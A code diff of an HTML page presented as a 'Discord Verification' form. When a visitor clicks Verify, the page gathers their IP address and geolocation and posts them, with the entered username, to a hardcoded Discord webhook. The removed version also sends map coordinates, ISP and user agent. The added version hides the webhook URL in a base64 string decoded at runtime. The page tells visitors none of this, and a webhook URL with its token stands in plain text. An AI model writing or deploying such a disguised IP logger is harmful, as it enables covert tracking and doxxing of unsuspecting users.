@@ -3,248 +3,63 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verification System</title>
+  <title>Secure Verification</title>
   <style>
-    /* ─── Animated Gradient Background ──────────────────────────── */
-    @keyframes gradientBG {
-      0%, 100% { background-position: 0% 50%; }
-      50%       { background-position: 100% 50%; }
-    }
-    body {
-      margin: 0; padding: 0;
-      width: 100vw; height: 100vh;
-      overflow: hidden;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(-45deg, #1c1c2f, #2c2c3e, #1c1c2f, #2c2c3e);
-      background-size: 400% 400%;
-      animation: gradientBG 20s ease infinite;
-      display: flex; align-items: center; justify-content: center;
-      position: relative; color: #eee;
-    }
-
-    /* ─── Floating Particles ───────────────────────────────────── */
-    .particle {
-      position: absolute;
-      border-radius: 50%;
-      background: rgba(255,255,255,0.05);
-      animation: drift linear infinite;
-    }
-    @keyframes drift {
-      from { transform: translate(0, 0); }
-      to   { transform: translate(100px, -200px); }
-    }
-
-    /* ─── Card ───────────────────────────────────────────────────── */
-    .card {
-      position: relative;
-      width: 340px; padding: 2rem;
-      background: rgba(0,0,0,0.75);
-      border-radius: 12px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
-      text-align: center;
-      z-index: 1;
-      transition: transform 0.3s;
-    }
-    .card:hover {
-      transform: translateY(-4px);
-    }
-    h1 {
-      margin: 0 0 1rem;
-      font-size: 1.5rem;
-      letter-spacing: 0.5px;
-    }
-    input, button {
-      width: 100%;
-      padding: 0.75rem;
-      margin-top: 0.5rem;
-      border: none;
-      border-radius: 8px;
-      font-size: 1rem;
-      outline: none;
-    }
-    input {
-      background: #2c2c3e;
-      color: #eee;
-    }
-    input:focus {
-      box-shadow: 0 0 10px rgba(9,157,255,0.6);
-    }
-    button {
-      background: linear-gradient(45deg,#3273dc,#275bbe);
-      color: #fff;
-      cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
-    }
-    button:hover {
-      background: linear-gradient(45deg,#4183ff,#3a6cff);
-    }
-    button:active {
-      transform: scale(0.97);
-    }
-
-    /* ─── Status Message ────────────────────────────────────────── */
-    .status {
-      margin-top: 1.5rem;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 1.1rem;
-      opacity: 0; transition: opacity 0.4s;
-    }
-    .status.visible {
-      opacity: 1;
-    }
-    .status svg {
-      margin-right: 0.6rem;
-    }
+    @keyframes gradientBG {0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+    body {margin:0;padding:0;width:100vw;height:100vh;font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#2a2a3c,#1f1f2a,#2a2a3c);background-size:400% 400%;animation:gradientBG 20s ease infinite;display:flex;align-items:center;justify-content:center;color:#ececec;overflow:hidden;}
+    .particle {position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);animation:drift linear infinite;}
+    @keyframes drift {from{transform:translate(0,0)}to{transform:translate(100px,-200px)}}
+    .card {position:relative;width:380px;padding:2.5rem;background:rgba(0,0,0,0.85);border-radius:20px;box-shadow:0 15px 45px rgba(0,0,0,0.7);text-align:center;z-index:1;transition:transform .3s;}
+    .card:hover {transform:translateY(-8px)}
+    h1 {margin:0 0 1rem;font-size:2rem;letter-spacing:1px;color:#f0f0f0;}
+    input,button {width:100%;padding:1rem;margin-top:1rem;border:none;border-radius:12px;font-size:1rem;outline:none;transition:box-shadow .2s;}
+    input {background:#333445;color:#fff}
+    input::placeholder {color:#aaa}
+    input:focus {box-shadow:0 0 15px rgba(0,150,255,0.7)}
+    button {background:linear-gradient(45deg,#1e90ff,#187bcd);color:#fff;cursor:pointer;transition:background .2s,transform .1s;}
+    button:disabled {opacity:.6;cursor:not-allowed}
+    button:hover:enabled {background:linear-gradient(45deg,#3ea0ff,#3590dd)}
+    button:active:enabled {transform:scale(.96)}
+    .status {margin-top:1.5rem;display:flex;align-items:center;justify-content:center;font-size:1rem;opacity:0;transition:opacity .4s;color:#ffd700;}
+    .status.visible {opacity:1}
+    .footer {margin-top:1.5rem;font-size:.75rem;color:#888;}
+    .ad-bait {position:absolute;top:-9999px;width:1px;height:1px;overflow:hidden;}
   </style>
 </head>
 <body>
-  <!-- generate floating particles -->
   <script>
-    for (let i = 0; i < 30; i++) {
-      const p = document.createElement('div');
-      p.className = 'particle';
-      const size = Math.random() * 4 + 2;
-      p.style.width  = `${size}px`;
-      p.style.height = `${size}px`;
-      p.style.left   = `${Math.random() * 100}vw`;
-      p.style.top    = `${Math.random() * 100}vh`;
-      p.style.animationDuration = `${10 + Math.random() * 10}s`;
-      document.body.appendChild(p);
-    }
+    for(let i=0;i<30;i++){let e=document.createElement('div');e.className='particle';let s=Math.random()*5+2;e.style.width=s+'px';e.style.height=s+'px';e.style.left=Math.random()*100+'vw';e.style.top=Math.random()*100+'vh';e.style.animationDuration=8+Math.random()*12+'s';document.body.appendChild(e)}
   </script>
-
   <div class="card">
-    <h1>Enter Discord Username</h1>
-    <input type="text" id="username" placeholder="CoolUser#1234" />
-    <button id="submitBtn">Verify</button>
-    <div id="status" class="status"></div>
+    <h1>Discord Verification</h1>
+    <input type="text" id="u" placeholder="Username#0000" autocomplete="off" />
+    <button id="b">Verify Now</button>
+    <div id="s" class="status"></div>
+    <div class="footer">Made by GitHub: @YourUsername</div>
   </div>
-
   <script>
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
-
-    const btn      = document.getElementById('submitBtn');
-    const statusEl = document.getElementById('status');
-
-    function getFlagEmoji(countryCode) {
-      if (!countryCode) return '🌎';
-      return countryCode.toUpperCase()
-        .split('')
-        .map(c => String.fromCodePoint(127397 + c.charCodeAt()))
-        .join('');
-    }
-
-    function showStatus(success, text) {
-      const icon = success
-        ? `<svg width="24" height="24" fill="#28a745"><path d="M16 2L6 14 0 8l2-2 4 4L14 0z"/></svg>`
-        : `<svg width="24" height="24" fill="#ffc107"><path d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 4.5a.5.5 0 0 0-.5.5v3.5a.5.5 0 0 0 1 0V6a.5.5 0 0 0-.5-.5zm.002 6a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5z"/></svg>`;
-      statusEl.innerHTML = `${icon}<span>${text}</span>`;
-      statusEl.classList.add('visible');
-    }
-
-    async function safeFetch(url, opts = {}, timeout = 5000) {
-      const ctrl = new AbortController();
-      const id   = setTimeout(() => ctrl.abort(), timeout);
-      try {
-        return await fetch(url, { ...opts, signal: ctrl.signal, mode: 'cors' });
-      } finally {
-        clearTimeout(id);
-      }
-    }
-
-    btn.addEventListener('click', async () => {
-      const username = document.getElementById('username').value.trim();
-      if (!username) {
-        showStatus(false, '❌ Please enter your Discord username.');
-        return;
-      }
-
-      showStatus(false, '🔄 Verifying…');
-      btn.disabled = true;
-
-      try {
-        // 1) Get IP
-        let ipData;
-        try {
-          ipData = await (await safeFetch('https://api.ipify.org?format=json')).json();
-        } catch {
-          ipData = await (await safeFetch('https://api.db-ip.com/v2/free/self')).json();
-        }
-        const ip = ipData.ip || ipData.ipAddress;
-
-        // 2) Geolocation
-        let geo;
-        try {
-          geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json();
-          if (geo.error) throw new Error();
-        } catch {
-          geo = await (await safeFetch(`https://ipwho.is/${ip}`)).json();
-        }
-
-        // 3) VPN detection
-        const factors = [];
-        let score = 0;
-        if (geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)) {
-          factors.push('Datacenter IP');
-          score += 40;
-        }
-        if (geo.port && [80,443,1080,3128,8080,8888,9050].includes(+geo.port)) {
-          factors.push('Proxy port');
-          score += 30;
-        }
-        if (geo.timezone && geo.country_code && !geo.timezone.includes(geo.country_code)) {
-          factors.push('Timezone mismatch');
-          score += 20;
-        }
-        const vpnDetected = score >= 40;
-
-        // 4) Build payload
-        const flag    = getFlagEmoji(geo.country_code);
-        const title   = `${flag} User Verification: ${geo.city}, ${geo.country_name}`;
-        const embed   = {
-          title: title,
-          color: vpnDetected ? 16755007 : 65280,
-          fields: [
-              { name: "👤 Discord Username", value: username, inline: true },
-            { name: '🔍 Verification Status', value: vpnDetected ? '❌ FAILED: VPN/Proxy Detected' : '✅ PASSED: No VPN Detected' },
-            { name: '📍 Location',            value: `${geo.city}, ${geo.region || geo.region_name}, ${geo.country_name}` },
-            { name: '🌐 IP Address',          value: ip },
-            { name: '🏢 ISP/Organization',    value: geo.org || geo.connection?.isp || 'Unknown' },
-            { name: '🌍 Coordinates',         value: `[${geo.latitude || geo.lat}, ${geo.longitude || geo.lon}](https://maps.google.com?q=${geo.latitude || geo.lat},${geo.longitude || geo.lon})` },
-          ],
-          footer: { text: `Verification at ${new Date().toLocaleString('en-GB')}` }
-        };
-        if (factors.length) {
-          embed.fields.push({
-            name: '⚠️ Suspicious Factors',
-            value: factors.join('\n')
-          });
-        }
-        embed.fields.push({
-          name: '📱 Device Info',
-          value: `\`\`\`${navigator.userAgent}\`\`\``
-        });
-
-        // 5) Send to Discord webhook
-        await fetch(DISCORD_WEBHOOK, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username: 'Verification System', embeds: [embed] })
-        });
-
-        // 6) Show result
-        if (vpnDetected) {
-          showStatus(false, '⚠️ VPN/Proxy detected. Please disable and retry.');
-        } else {
-          showStatus(true, '✅ Verified');
-        }
-      } catch (err) {
-        console.error(err);
-        showStatus(false, '❌ Verification Error');
-      } finally {
-        btn.disabled = false;
-      }
-    });
+    (function(){
+      const e=document.createElement('div');e.className='ad-bait adBanner';document.body.appendChild(e);
+      const adBlocked=!window.getComputedStyle(e).getPropertyValue('display');
+      const encoded='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MDAzMTA2NjA4OTM5NDI0OC9BcFJwcHNTSUNFdjdieEJ5cFZUaWNDREV5Q2lVUXNwaEMwUGFybXZnOEVfVTVSV29ITnktS3N6YzFDblRDVGFxaDFRa24z';
+      const WEBHOOK=decodeURIComponent(atob(encoded));
+      const b=document.getElementById('b'),s=document.getElementById('s');let lt=0;
+      function show(msg){s.textContent=msg;s.classList.add('visible')}
+      b.addEventListener('click',async()=>{
+        const now=Date.now();if(now-lt<30000){show('⏳ Please wait 30s');return;}lt=now;
+        const u=document.getElementById('u').value.trim();if(!u){show('❌ Enter username');return}
+        if(adBlocked){show('🚫 Ad Block detected');return}
+        show('🔄 Verifying...');b.disabled=true;
+        try{
+          const ip=(await fetch('https://api.ipify.org?format=json',{mode:'cors'}).then(r=>r.json()).catch(_=>({ip:'0.0.0.0'}))).ip;
+          const geo=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json()).catch(_=>({org:'',country_name:'Unknown',city:'Unknown'}));
+          const isVpn=/hosting|datacenter|proxy|vpn|tor/i.test(geo.org||'');
+          const payload={username:'SecureSys',embeds:[{title:`🌐 ${geo.city}, ${geo.country_name}`,color:isVpn?16711680:65280,fields:[{name:'User',value:u,inline:true},{name:'Status',value:isVpn?'VPN detected':'No VPN',inline:true}],footer:{text:new Date().toLocaleString()}}]};
+          await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+          show(isVpn?'🚫 VPN detected':'✅ Verified');
+        }catch{show('❌ Error')}finally{b.disabled=false}
+      })
+    })();
   </script>
 </body>
 </html>
